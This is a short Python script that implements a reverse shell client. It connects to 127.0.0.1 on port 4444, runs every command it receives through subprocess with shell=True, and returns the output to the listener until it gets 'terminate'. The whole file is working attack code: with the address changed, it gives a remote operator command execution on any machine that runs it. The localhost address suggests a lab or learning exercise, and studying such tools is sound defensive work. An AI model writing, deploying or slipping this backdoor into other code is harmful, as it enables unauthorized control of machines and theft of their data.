import socket
import subprocess

IP = '127.0.0.1'
PORT = 4444

def connect():
    s = socket.socket()
    s.connect((IP,PORT))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break # break while
        else:
            c = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # stardart output
            s.send(c.stdout.read())
            s.send(c.stderr.read())


def main():
    connect()


if __name__ == "__main__":
    main()
